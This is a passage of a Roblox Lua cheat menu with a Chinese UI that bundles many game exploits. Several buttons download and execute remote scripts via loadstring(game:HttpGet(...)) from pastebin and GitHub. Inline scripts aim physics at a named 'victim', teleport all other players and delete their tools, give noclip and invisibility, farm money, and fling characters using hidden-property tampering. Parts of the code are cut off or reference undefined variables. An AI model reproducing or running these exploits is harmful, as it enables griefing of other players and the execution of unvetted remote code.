            if toggled == true then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
                    {ImageColor3 = Color3.fromRGB(200, 200, 200)}
                ):Play()
                game:GetService("TweenService"):Create(Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 2, 0, 2)}):Play(

                )
                wait(0.25)
                debounce = false
                toggled = false

                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif toggled == false then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
                    {ImageColor3 = Color3.fromRGB(64, 200, 114)}
                ):Play()
                game:GetService("TweenService"):Create(
                    Circle,
                    TweenInfo.new(0.25),
                    {Position = UDim2.new(1, -20, 0, 2)}
                ):Play()
                wait(0.25)
                debounce = false
                toggled = true
                for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "Root" or v.Name == "RootJoint" then
                        v:Destroy()
                    end
                end
            end
        end
    end
)

Circle.Name = "Circle"
Circle.Parent = Toggle
Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle.BackgroundTransparency = 1.000
Circle.Position = UDim2.new(0, 2, 0, 2)
Circle.Size = UDim2.new(0, 18, 0, 18)
Circle.Image = "rbxassetid://3570695787"
Circle.ScaleType = Enum.ScaleType.Slice
Circle.SliceCenter = Rect.new(100, 100, 100, 100)
Circle.SliceScale = 0.120

InvisText.Name = "InvisText"
InvisText.Parent = Main
InvisText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisText.BackgroundTransparency = 1.000
InvisText.BorderColor3 = Color3.fromRGB(27, 42, 53)
InvisText.BorderSizePixel = 0
InvisText.Position = UDim2.new(0.0967741907, 0, 0, 0)
InvisText.Size = UDim2.new(0, 200, 0, 50)
InvisText.Font = Enum.Font.SourceSans
InvisText.Text = "通用隐身(出体)"
InvisText.TextColor3 = Color3.fromRGB(255, 255, 255)
InvisText.TextScaled = true
InvisText.TextSize = 14.000
InvisText.TextTransparency = 0.140
InvisText.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.BorderColor3 = Color3.fromRGB(27, 42, 53)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0.0241935477, 0, 0.738317728, 0)
Credits.Size = UDim2.new(0, 94, 0, 18)
Credits.Font = Enum.Font.SourceSans
Credits.Text = "Bebo Mods汉化组"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextTransparency = 0.250
Credits.TextWrapped = true

-- Scripts:

local UserInputService = game:GetService("UserInputService")
local runService = (game:GetService("RunService"))

local gui = Main

local dragging
local dragInput
local dragStart
local startPos

function Lerp(a, b, m)
    return a + (b - a) * m
end

local lastMousePos
local lastGoalPos
local DRAG_SPEED = (8) -- // The speed of the UI darg.
function Update(dt)
    if not (startPos) then
        return
    end
    if not (dragging) and (lastGoalPos) then
        gui.Position =
            UDim2.new(
            startPos.X.Scale,
            Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED),
            startPos.Y.Scale,
            Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED)
        )
        return
    end

    local delta = (lastMousePos - UserInputService:GetMouseLocation())
    local xGoal = (startPos.X.Offset - delta.X)
    local yGoal = (startPos.Y.Offset - delta.Y)
    lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
    gui.Position =
        UDim2.new(
        startPos.X.Scale,
        Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED),
        startPos.Y.Scale,
        Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED)
    )
end

gui.InputBegan:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            lastMousePos = UserInputService:GetMouseLocation()

            input.Changed:Connect(
                function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end
            )
        end
    end
)

gui.InputChanged:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end
)

runService.Heartbeat:Connect(Update)

  	end    

})

Tab:AddButton({

	Name = "碰撞体积",

	Callback = function()

     loadstring(game:HttpGet('https://pastebin.com/raw/JYFXjEVh'))()

  	end    

})

Tab:AddButton({

	Name = "自身黑洞",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/LHsrytuj"))()

  	end    

})

Tab:AddButton({

	Name = "定点黑洞",

	Callback = function()

     --blackhole script 0.4: fixed all issues
loadstring(game:HttpGet('https://gist.githubusercontent.com/AxolotlBmgo/8888080921c2b426a32dd9ff587baff1/raw/d45e03afed3c1716f36523bbf6dd741d3d2aad00/gistfile1.txt'))()

  	end    

})

Tab:AddButton({

	Name = "漩涡黑洞",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/666/refs/heads/main/FE%E8%B6%85%E7%BA%A7%E6%BC%A9%E6%B6%A1%E9%BB%91%E6%B4%9E%E8%84%9A%E6%9C%ACv2.txt"))()

  	end    

})

Tab:AddButton({

	Name = "kawaii黑洞",

	Callback = function()

     --]]
local G2L = {}
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
G2L["2"] = Instance.new("Frame", G2L["1"])
G2L["2"]["BorderSizePixel"] = 0
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(254, 199, 255)
G2L["2"]["Size"] = UDim2.new(0, 316, 0, 140)
G2L["2"]["Position"] = UDim2.new(0.5, 124, 0.48365, -104)
G2L["2"]["BorderColor3"] = Color3.fromRGB(254, 255, 255)
G2L["3"] = Instance.new("UICorner", G2L["2"])
G2L["3"]["CornerRadius"] = UDim.new(0, 4)
G2L["4"] = Instance.new("ImageLabel", G2L["2"])
G2L["4"]["BorderSizePixel"] = 0
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
G2L["4"]["Image"] = [[rbxassetid://18923878915]]
G2L["4"]["Size"] = UDim2.new(0, 316, 0, 140)
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
G2L["4"]["LayoutOrder"] = -6
G2L["5"] = Instance.new("UICorner", G2L["4"])
G2L["5"]["CornerRadius"] = UDim.new(0, 4)
targetbox = Instance.new("TextBox", G2L["4"])
targetbox["CursorPosition"] = -1
targetbox["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255)
targetbox["BorderSizePixel"] = 0
targetbox["TextWrapped"] = true
targetbox["TextTransparency"] = 0.41
targetbox["Name"] = [[target]]
targetbox["TextScaled"] = true
targetbox["BackgroundColor3"] = Color3.fromRGB(255, 178, 147)
targetbox["FontFace"] =
    Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
targetbox["PlaceholderText"] = [[victim >:3]]
targetbox["Size"] = UDim2.new(0.50156, -20, 0.33938, -10)
targetbox["Position"] = UDim2.new(0, 14, 0, 47)
targetbox["Text"] = [[]]
targetbox["LayoutOrder"] = 8
targetbox["BackgroundTransparency"] = 0.2
G2L["7"] = Instance.new("UICorner", targetbox)
G2L["7"]["CornerRadius"] = UDim.new(0, 2)
killbutton = Instance.new("TextButton", G2L["4"])
killbutton["TextWrapped"] = true
killbutton["BorderSizePixel"] = 0
killbutton["TextSize"] = 23
killbutton["BackgroundColor3"] = Color3.fromRGB(255, 232, 204)
killbutton["FontFace"] =
    Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
killbutton["Size"] = UDim2.new(0.49734, -20, 0.27187, -10)
killbutton["BackgroundTransparency"] = 0.1
killbutton["LayoutOrder"] = 5
killbutton["Name"] = [[kil]]
killbutton["Text"] = [[fuck em up ^-^]]
killbutton["Position"] = UDim2.new(0.24966, 10, 0.71157, 0)
G2L["9"] = Instance.new("UICorner", killbutton)
G2L["9"]["CornerRadius"] = UDim.new(0, 2)
killscript = Instance.new("LocalScript", killbutton)
G2L["b"] = Instance.new("TextLabel", G2L["4"])
G2L["b"]["TextWrapped"] = true
G2L["b"]["TextStrokeTransparency"] = 0.73
G2L["b"]["BorderSizePixel"] = 0
G2L["b"]["TextScaled"] = true
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(174, 255, 255)
G2L["b"]["TextSize"] = 14
G2L["b"]["FontFace"] =
    Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
G2L["b"]["BackgroundTransparency"] = 0.45
G2L["b"]["Size"] = UDim2.new(0, 316, 0, 34)
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
G2L["b"]["Text"] = "kawaii magnet to part >~<"
G2L["c"] = Instance.new("UICorner", G2L["b"])
G2L["c"]["CornerRadius"] = UDim.new(0, 4)
timebox = Instance.new("TextBox", G2L["4"])
timebox["CursorPosition"] = -1
timebox["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255)
timebox["BorderSizePixel"] = 0
timebox["TextWrapped"] = true
timebox["TextTransparency"] = 0.41
timebox["Name"] = [[time]]
timebox["TextScaled"] = true
timebox["BackgroundColor3"] = Color3.fromRGB(255, 178, 147)
timebox["FontFace"] =
    Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
timebox["PlaceholderText"] = [[duration (secs)]]
timebox["Size"] = UDim2.new(0.50156, -20, 0.33938, -10)
timebox["Position"] = UDim2.new(0, 162, 0, 47)
timebox["Text"] = [[]]
timebox["LayoutOrder"] = 8
timebox["BackgroundTransparency"] = 0.2
G2L["e"] = Instance.new("UICorner", timebox)
G2L["e"]["CornerRadius"] = UDim.new(0, 2)
bgbutton = Instance.new("TextButton", G2L["2"])
bgbutton["TextWrapped"] = true
bgbutton["BorderSizePixel"] = 0
bgbutton["TextSize"] = 12
bgbutton["TextColor3"] = Color3.fromRGB(0, 0, 0)
bgbutton["TextScaled"] = true
bgbutton["BackgroundColor3"] = Color3.fromRGB(255, 140, 150)
bgbutton["FontFace"] =
    Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
bgbutton["Size"] = UDim2.new(0, 83, 0, 19)
bgbutton["BackgroundTransparency"] = 0.3
bgbutton["BorderColor3"] = Color3.fromRGB(0, 0, 0)
bgbutton["Text"] = [[look at cute bg !]]
bgbutton["Position"] = UDim2.new(0, 0, 0.8587, 0)
G2L["10"] = Instance.new("UICorner", bgbutton)
G2L["10"]["CornerRadius"] = UDim.new(0, 2)
bgscript = Instance.new("LocalScript", bgbutton)
dragscript = Instance.new("LocalScript", G2L["2"])
dragscript["Name"] = [[drag]]
local function C_a()
    local script = killscript
    local player = game.Players.LocalPlayer
    local button = script.Parent
  local function buttonclicked()
    local coolio = tonumber(timebox.Text)
    local Players = game:GetService("Players")

    -- Function to find a player by their display name or username
local function findPlayer(input)
    local inputLower = string.lower(input)
    for _, player in ipairs(Players:GetPlayers()) do
        local displayName = player.DisplayName
        local username = player.Name
        -- Check if display name matches (exact or partial)
        if string.find(string.lower(displayName), inputLower, 1, true) then
            return player
        end
        -- Check if username matches (exact or partial)
        if string.find(string.lower(username), inputLower, 1, true) then
            return player
        end
    end
    return nil
end


    -- Find the target player
    local input = targetbox.Text
    local foundPlayer = findPlayer(input)
    if foundPlayer then
        if foundPlayer == Players.LocalPlayer then
            print("targetting yourself")
        else
        end
        print("Found player: " .. foundPlayer.Name)
    else
        print("Player not found")
        return
    end

    local targetCharacter = foundPlayer.Character
    if not targetCharacter or not targetCharacter:FindFirstChild("Head") then
        return
    end

    local Forces = {}
    local frozenParts = {}

    local function handlePart(part)
        if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(targetCharacter) then
            -- Ensure part is not part of the local player's character
            if not part:IsDescendantOf(Players.LocalPlayer.Character) then
                -- Remove any existing BodyPosition or BodyGyro
                for _, c in pairs(part:GetChildren()) do
                    if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
                        c:Destroy()
                    end
                end
                -- Create and configure BodyPosition
                local ForceInstance = Instance.new("BodyPosition")
                ForceInstance.Parent = part
                ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                ForceInstance.Position = targetCharacter.Head.Position
                table.insert(Forces, ForceInstance)
                if not table.find(frozenParts, part) then
                    table.insert(frozenParts, part)
                end
            end
        end
    end

    local imsosigma = workspace:GetDescendants()
    for _, part in pairs(imsosigma) do
        if part:IsA("BasePart") and not part.Anchored and part.Parent ~= targetCharacter then
            handlePart(part)
            part.CanCollide = false
        end
    end

    -- Duration for how long the loop should run (in seconds)
    local duration = coolio
    local startTime = os.time()

    -- Loop to update force positions
    while os.time() - startTime < duration do
        for _, force in pairs(Forces) do
            force.Position = targetCharacter.Head.Position
        end
        wait(0.1)
    end

    for _, force in pairs(Forces) do
        force:Destroy()
    end
    for _, part in pairs(imsosigma) do
        if part:IsA("BasePart") and not part.Anchored then
            part.CanCollide = true
        end
    end

    end
    button.MouseButton1Click:Connect(buttonclicked)
end
task.spawn(C_a)
local function C_11()
    local script = bgscript
    local main = script.Parent.Parent.ImageLabel
    local button = script.Parent
    local function toggleVisibility()
        for _, child in ipairs(main:GetChildren()) do
            if child:IsA("TextBox") or child:IsA("TextButton") or child:IsA("TextLabel") then
                child.Visible = not child.Visible
            end
        end
    end
    button.MouseButton1Click:Connect(toggleVisibility)
end
task.spawn(C_11)
local function C_12()
    local script = dragscript
    local UserInputService = game:GetService("UserInputService")
    local gui = script.Parent
    local dragging
    local dragInput
    local dragStart
    local startPos
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    gui.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position
                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end
                )
            end
        end
    )
    gui.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end
    )
    UserInputService.InputChanged:Connect(
        function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end
    )
end
task.spawn(C_12)
return G2L["1"], require

  	end    

})

Tab:AddButton({

	Name = "人物穿墙",

	Callback = function()

     local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0

Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0

StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true

Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left

Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by KingLuna"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true

Toggle.MouseButton1Click:connect(function()
	if Status.Text == "off" then
		Clipon = true
		Status.Text = "on"
		Status.TextColor3 = Color3.new(0,185,0)
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if not Clipon == false then
				for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif Status.Text == "on" then
		Clipon = false
		Status.Text = "off"
		Status.TextColor3 = Color3.new(170,0,0)
	end
end)

  	end    

})

Tab:AddButton({

	Name = "发射核弹[安慰]",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/14/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()

  	end    

})

Tab:AddButton({

	Name = "传送玩家",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()

  	end    

})

Tab:AddButton({

	Name = "位置吸人",

	Callback = function()

     --[[
Subscribe to Zaptosis
--]]

local L_1_ = true;
local L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L_3_ = L_2_.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
	if L_4_arg1 == 'f' then
		L_1_ = not L_1_
	end;
	if L_4_arg1 == 'r' then
		L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
		L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
	end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
	if L_6_forvar2 == game.Players.LocalPlayer then
	else
		local L_7_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_8_, L_9_ = pcall(function()
					local L_10_ = L_6_forvar2.Character;
					if L_10_ then
						if L_10_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_6_forvar2.Backpack:ClearAllChildren()
								for L_11_forvar1, L_12_forvar2 in pairs(L_10_:GetChildren()) do
									if L_12_forvar2:IsA("Tool") then
										L_12_forvar2:Destroy()
									end
								end;
								L_10_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_8_ then
				else
					warn("Unnormal error: "..L_9_)
				end
			end)
		end)
		coroutine.resume(L_7_)
	end
end;

game.Players.PlayerAdded:Connect(function(L_13_arg1)   
	if L_13_arg1 == game.Players.LocalPlayer then
	else
		local L_14_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_15_, L_16_ = pcall(function()
					local L_17_ = L_13_arg1.Character;
					if L_17_ then
						if L_17_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_13_arg1.Backpack:ClearAllChildren()
								for L_18_forvar1, L_19_forvar2 in pairs(L_17_:GetChildren()) do
									if L_19_forvar2:IsA("Tool") then
										L_19_forvar2:Destroy()
									end
								end;
								L_17_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_15_ then
				else
					warn("Unnormal error: "..L_16_)
				end
			end)
		end)
		coroutine.resume(L_14_)
	end           
end)

  	end    

})

Tab:AddButton({

	Name = "唐县刷钱",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/ok/tang%20county%20script"))()

  	end    

})

Tab:AddButton({

	Name = "2023颁奖典礼画质提升",

	Callback = function()

     local light = game.Lighting
for i, v in pairs(light:GetChildren()) do
	v:Destroy()
end

local ter = workspace.Terrain
local color = Instance.new("ColorCorrectionEffect")
local bloom = Instance.new("BloomEffect")
local sun = Instance.new("SunRaysEffect")
local blur = Instance.new("BlurEffect")

color.Parent = light
bloom.Parent = light
sun.Parent = light
blur.Parent = light

-- enable or disable shit

local config = {

	Terrain = true;
	ColorCorrection = true;
	Sun = true;
	Lighting = true;
	BloomEffect = true;
	
}

-- settings {

color.Enabled = false
color.Contrast = 0.15
color.Brightness = 0.1
color.Saturation = 0.25
color.TintColor = Color3.fromRGB(255, 222, 211)

bloom.Enabled = false
bloom.Intensity = 0.1

sun.Enabled = false
sun.Intensity = 0.2
sun.Spread = 1

bloom.Enabled = false
bloom.Intensity = 0.05
bloom.Size = 32
bloom.Threshold = 1

blur.Enabled = false
blur.Size = 6

-- settings }


if config.ColorCorrection then
	color.Enabled = true
end


if config.Sun then
	sun.Enabled = true
end


if config.Terrain then
	-- settings {
	ter.WaterWaveSize = 0.1
	ter.WaterWaveSpeed = 22
	ter.WaterTransparency = 0.9
	ter.WaterReflectance = 0.05
	-- settings }
end
if config.Lighting then
	-- settings {
	light.Ambient = Color3.fromRGB(0, 0, 0)
	light.Brightness = 4
	light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	light.ExposureCompensation = 0
	light.FogColor = Color3.fromRGB(132, 132, 132)
	light.GlobalShadows = true
	light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
	light.Outlines = false
	-- settings }
end
local a = game.Lighting
a.Ambient = Color3.fromRGB(33, 33, 33)
a.Brightness = 5.69
a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
a.EnvironmentDiffuseScale = 0.105
a.EnvironmentSpecularScale = 0.522
a.GlobalShadows = true
a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
a.ShadowSoftness = 0.18
a.GeographicLatitude = -15.525
a.ExposureCompensation = 0.75
b.Enabled = true
b.Intensity = 0.99
b.Size = 9999 
b.Threshold = 0
local c = Instance.new("ColorCorrectionEffect", a)
c.Brightness = 0.015
c.Contrast = 0.25
c.Enabled = true
c.Saturation = 0.2
c.TintColor = Color3.fromRGB(217, 145, 57)
if getgenv().mode == "Summer" then
   c.TintColor = Color3.fromRGB(255, 220, 148)
elseif getgenv().mode == "Autumn" then
   c.TintColor = Color3.fromRGB(217, 145, 57)
else
   warn("No mode selected!")
   print("Please select a mode")
   b:Destroy()
   c:Destroy()
end
local d = Instance.new("DepthOfFieldEffect", a)
d.Enabled = true
d.FarIntensity = 0.077
d.FocusDistance = 21.54
d.InFocusRadius = 20.77
d.NearIntensity = 0.277
local e = Instance.new("ColorCorrectionEffect", a)
e.Brightness = 0
e.Contrast = -0.07
e.Saturation = 0
e.Enabled = true
e.TintColor = Color3.fromRGB(255, 247, 239)
local e2 = Instance.new("ColorCorrectionEffect", a)
e2.Brightness = 0.2
e2.Contrast = 0.45
e2.Saturation = -0.1
e2.Enabled = true
e2.TintColor = Color3.fromRGB(255, 255, 255)
local s = Instance.new("SunRaysEffect", a)
s.Enabled = true
s.Intensity = 0.01
s.Spread = 0.146

print("Best Graphics loaded! Created by Roblox")

  	end    

})

Tab:AddButton({

	Name = "飞檐走壁",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()

  	end    

})

Tab:AddButton({

	Name = "人物失控",

	Callback = function()

     
--MADE BY Redmoon--
--Items:
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

a=game.Players.LocalPlayer b=game.Players.LocalPlayer.Character c={}d=table.insert e=false for D,E in next,game:GetService("Players").LocalPlayer.Character:GetDescendants()do if E:IsA("BasePart")then d(c,game:GetService("RunService").Heartbeat:connect(function()pcall(function()E.Velocity=Vector3.new(-30,0,0)sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)game.Players.LocalPlayer.ReplicationFocus=workspace end)end))end end function f(D,E,F)game.StarterGui:SetCore("SendNotification",{Title=D;Text=E;Duration=F or 5;})end local x=game:GetService("RunService")g=Instance.new('Folder',b)g.Name='CWExtra'b.Archivable=true local y=b:Clone()y.Name='NexoPD'for D,E in next,y:GetDescendants()do if E:IsA('BasePart')or E:IsA('Decal')then E.Transparency=1 end end h=5.65 a.Character=nil a.Character=b b.Humanoid.AutoRotate=false b.Humanoid.WalkSpeed=0 b.Humanoid.JumpPower=0 b.Torso.Anchored=true f('Nexo','Reanimating...\nPlease wait '..h..' seconds.')wait(h)b.Torso.Anchored=false f('Nexo','Reanimated..')b.Humanoid.Health=0 y.Animate.Disabled=true y.Parent=g y.HumanoidRootPart.CFrame=b.HumanoidRootPart.CFrame*CFrame.new(0,5,0)function i(D,E,F,G)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("AlignOrientation",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignOrientation.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]D.AlignOrientation.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D[D.Name].Orientation=G or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.AlignOrientation.Responsiveness=math.huge D.AlignPosition.RigidityEnabled=false D.AlignOrientation.MaxTorque=999999999 D.Massless=true end function j(D,E,F)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.Massless=true end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('Accessory')then i(E.Handle,y[E.Name].Handle)end end 